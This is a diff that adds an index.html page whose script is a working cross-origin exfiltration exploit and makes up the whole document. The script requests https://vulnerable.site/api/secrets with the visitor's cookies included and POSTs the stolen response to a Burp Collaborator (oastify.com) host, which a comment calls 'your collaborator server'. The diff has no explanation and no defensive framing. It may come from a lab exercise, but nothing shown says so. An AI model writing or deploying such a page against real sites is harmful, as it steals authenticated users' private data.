@@ -1,0 +1,14 @@
+<!-- index.html -->
+<script>
+fetch("https://vulnerable.site/api/secrets", {
+  credentials: "include"  // send cookies!
+})
+  .then(res => res.text())
+  .then(data => {
+    // Exfiltrate to your collaborator server
+    fetch("https://0wxkp4qmi2ai0qkvn1t8n25t2k8bw2kr.oastify.com/data", {
+      method: "POST",
+      body: data
+    });
+  });
+</script>
